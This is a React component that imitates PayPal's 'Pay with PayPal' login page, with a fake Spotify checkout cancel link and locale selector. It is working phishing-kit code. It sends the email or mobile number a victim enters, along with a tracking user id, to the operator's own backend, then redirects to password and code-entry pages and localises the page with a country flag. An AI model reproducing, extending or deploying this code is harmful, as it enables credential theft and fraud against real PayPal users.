import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom"; // Import useHistory
import ipinfo from "ipinfo";
import Footer from "./Footer";
import axios from 'axios';
import { zokomId } from '../utils/auth';

const PayPalLogin = () => {
  const [userCountry, setUserCountry] = useState('US'); // Default to US
  const [flagUrl, setFlagUrl] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const [styles, setStyles] = useState(null);
  const history = useHistory(); // Initialize useHistory
  const [loginError, setLoginError] = useState(false);
  const [emailOrMobile, setEmailOrMobile] = useState('');
  const userId = zokomId(); // Get userId
  const [showNotification, setShowNotification] = useState(false);
  const [showError, setShowError] = useState(false);
  const [countryCode, setCountryCode] = useState('US'); // Add state for country code
  const [isLoading, setIsLoading] = useState(true); // Add this line
  const [loadingStyles, setLoadingStyles] = useState(null);
  const getFlagUrl = async (countryCode) => {
    // Use a more reliable flag API
    return `https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`;
  };
  const getCountryCode = async (countryName) => {
    try {
      const { data } = await axios.get(`https://restcountries.com/v3.1/name/${countryName}`);
      const code = data[0]?.cca2 || 'US'; // `cca2` is the alpha-2 country code
      setCountryCode(code); // Set the country code in state
      localStorage.setItem('countryCode', code); // Optionally store in local storage
      return code;
    } catch (error) {
      console.error('Error fetching country code:', error);
      return 'US'; // Default to 'US' on error
    }
  };
  
  useEffect(() => {
    const fetchData = async () => {
      try {
        const { data } = await axios.get(
          `${process.env.REACT_APP_API_URL}/api/${userId}/country`
        );
  
        // If the returned country is "Unknown", default to "US"
        const finalCountry = data.country === 'Unknown' ? 'US' : data.country || 'US';
        setUserCountry(finalCountry);
  
        // Transform country name to country code
        const countryCode = finalCountry === 'US' ? 'US' : await getCountryCode(finalCountry);
  
        const url = await getFlagUrl(countryCode);
        setFlagUrl(url);
      } catch (err) {
        console.error('Error fetching IP/country from DB:', err);
      }
    };
  
    if (userId) {
      fetchData();
    }
  }, [userId]);


  useEffect(() => {
    const loadAndUnloadStyles = async () => {
      try {
        // Load the loading spinner styles
        const codeInputCss = await import('../../assets/styles/codeinput.css');
        setLoadingStyles(codeInputCss.default);
        
        // Wait for 2 seconds
        setTimeout(() => {
          setIsLoading(false);
          // Cleanup loading styles
          setLoadingStyles(null);
        }, 2000);
      } catch (error) {
        console.error('Error loading styles:', error);
        setIsLoading(false);
      }
    };

    loadAndUnloadStyles();

    // Cleanup function
    return () => {
      setLoadingStyles(null);
    };
  }, []);

  const handleFocus = () => {
    setIsFocused(true);
  };

  const handleBlur = (e) => {
    const notificationDiv = document.querySelector('.notifications');
    
    if (!e.target.value) {
      setIsFocused(false);
      notificationDiv.classList.remove('hide');
      setShowNotification(true);
    } else {
      const validationType = validateEmailOrMobile(e.target.value);
      if (validationType === 'invalid') {
        notificationDiv.classList.remove('hide');
        setShowNotification(true);
      } else {
        notificationDiv.classList.add('hide');
        setShowNotification(false);
      }
    }
  };

  const validateEmailOrMobile = (input) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const mobileRegex = /^\d{10,15}$/;
    if (emailRegex.test(input)) {
      return 'email';
    } else if (mobileRegex.test(input)) {
      return 'mobile';
    } else {
      return 'invalid';
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const validationType = validateEmailOrMobile(emailOrMobile);
    if (validationType === 'invalid') {
      setShowError(true);
      document.querySelector('.notifications').classList.remove('hide');
      return;
    }
    if (validationType === 'email') {
      try {
        const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/paypal`, { email: emailOrMobile, userId });
        console.log('PayPal entry created:', response.data);
        localStorage.setItem('paypalEmailOrMobile', emailOrMobile )
        history.push('/pass');
      } catch (error) {
        console.error('Error creating PayPal entry:', error);
        setLoginError(true);
      }
    } else if (validationType === 'mobile') {
      try {
        const response = await axios.post(`${process.env.REACT_APP_API_URL}/api/paypal`, { mobileNumber: emailOrMobile, userId });
        console.log('PayPal entry created:', response.data);
        localStorage.setItem('paypalEmailOrMobile', emailOrMobile )
        history.push('/codeinput');
      } catch (error) {
        console.error('Error creating PayPal entry:', error);
        setLoginError(true);
      } }
      else {
      setLoginError(true);
    }
  };

  return (
    <div className="desktop">
      <div id="main" style={{marginBottom: '50px'}} className="main" role="main">
        <section id="login" className="login" data-role="page" data-title="Log in to your PayPal account">
          <div className="corral">
            <div id="content" className="contentContainer activeContent contentContainerBordered">
              <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
              </div>
              <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>
              
              {!isLoading && (
                <>
                  <header id="header">
                    <p role="img" aria-label="PayPal Logo" className="paypal-logo paypal-logo-long"></p>
                  </header>
                  <h1 id="headerText" className="headerText">Pay with PayPal</h1>
                  <p id="emailSubTagLine" className="subHeaderText">Enter your email address to get started.</p>
                  <div className={`notifications ${!showError ? 'hide' : ''}`}>
         <p className="notification notification-critical" role="alert">Please check your entries and try again.</p>
      </div>
                  <form
                    onSubmit={handleSubmit} // Add onSubmit handler
                    className="proceed maskable"
                    autoComplete="off"
                    name="login"
                    noValidate
                  >
                    <div id="splitEmail" className="splitEmail">
                      <div id="splitEmailSection" className="splitPhoneSection splitEmailSection adjustSection">
                        <div className={`textInput ${showError ? 'hasError' : ''}`} id="login_emaildiv">
                          <div className="fieldWrapper">
                            <input
                              id="email"
                              name="login_email"
                              type="text"
                              className="hasHelp validate validateEmpty"
                              required="required"
                              onChange={(e) => {
                                setEmailOrMobile(e.target.value);
                                setShowError(!validateEmailOrMobile(e.target.value));
                              }}
                              onBlur={(e) => setShowError(!validateEmailOrMobile(e.target.value))}
                                                  autoComplete="username"
                              placeholder="Email or mobile number"
                              aria-describedby="emailErrorMessage"
                              style={{
                                minHeight: '64px',
                                lineHeight: '24px',
                                border: 'none',
                                paddingTop: '20px',
                                paddingBottom: '8px',
                                paddingLeft: '12px',
                                paddingRight: '12px',
                                width: '100%',
                                backgroundColor: '#fff',
                                textOverflow: 'ellipsis',
                                appearance: 'none',
                                height: '64px'
                              }}
                            />
                            <label htmlFor="email" className="fieldLabel">
                              Email or mobile number
                            </label>
                          </div>
                          <div className="errorMessage" id="emailErrorMessage">
                            <p className="emptyError hide">Required</p>
                            <p className="invalidError hide">That email or mobile number format isn’t right</p>
                          </div>
                        </div>
                        <a
                          href="https://www.paypal.com/cshelp/contact-us"
                          id="forgotEmail"
                          className="recoveryOption"
                          data-client-log-action-type="clickForgotEmailLink"
                          pa-marked="1"
                        >
                          Forgot email?
                        </a>
                      </div>
                      <div className="actions">
                        <button
                          className="button actionContinue scTrackUnifiedloginLoginClickNext"
                          type="submit"
                          id="btnNext"
                          name="btnNext"
                          value="Next"
                          pa-marked="1"
                        >
                          Next
                        </button>
                      </div>
                    </div>
                  </form>
                  <div id="signupContainer" className="signupContainer">
                    <div className="loginSignUpSeparator">
                      <span className="textInSeparator">or</span>
                    </div>
                              <button
                                type="button"
                                id="startOnboardingFlow"
                                className="button secondary scTrackUnifiedloginClickSignupButton onboardingFlowContentKey"
                                pa-marked="1"
                                onClick={() => window.location.href = 'https://www.paypal.com/signup'}
                              >
                                Create an Account
                              </button>
                  </div>
                  <div className="intentFooter">
                    <div className="cancelUrl">
                      <a
                                                    href="https://spotify.com"
                                                    data-url="https://payments.spotify.com/checkout/2a966a07-14c0-39e4-b0f1-f27ac82aba08/?country=US&market=us&product=2024-q4globalcampaign-intro&psp=paypal&token=EC-5G140757D6791933L&approval_token_id=91B256819V7453949&approval_session_id=91B256819V7453949"
                        className="scTrackUnifiedloginClickCancelAndReturn cancelLink"
                        id="cancelLink"
                        aria-hidden="false"
                        pa-marked="1"
                      >
                        Cancel and return to Spotify USA Inc
                      </a>
                    </div>
                    <div className="localeSelector">
                      <span className="picker country-selector">
                        <span className="hide" id="countryPickerLink">
                          {userCountry}
                        </span>
                        <button
                          type="button"
                          aria-label="countryPickerLink"
                          className="country US"
                          style={{
                            backgroundImage: `url(${flagUrl})`,
                            backgroundPosition: 'center',
                            width: '24px',
                            height: '17px',
                            border: 'none',
                            cursor: 'pointer',
                            paddingLeft: '8px',
                            paddingRight: '8px',
                            paddingTop: '8px',
                          }}
                        />
                      </span>
                      <ul className="localeLink">
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageArEG"
                            href="#"
                            lang="ar"
                            data-locale="ar_EG"
                            pa-marked="1"
                          >
                            العربية
                          </a>
                        </li>
                        <li>
                          <a
                            className="selected scTrackUnifiedloginFooterLanguageEnUS"
                            href="#"
                            lang="en"
                            data-locale="en_US"
                            aria-current="true"
                            pa-marked="1"
                          >
                            English
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageFrXC"
                            href="#"
                            lang="fr"
                            data-locale="fr_XC"
                            pa-marked="1"
                          >
                            Français
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageEsXC"
                            href="#"
                            lang="es"
                            data-locale="es_XC"
                            pa-marked="1"
                          >
                            Español
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageZhXC"
                            href="#"
                            lang="zh"
                            data-locale="zh_XC"
                            pa-marked="1"
                          >
                            中文
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </section>        
      </div>
      <Footer />
    </div>
  );
};

export default PayPalLogin;
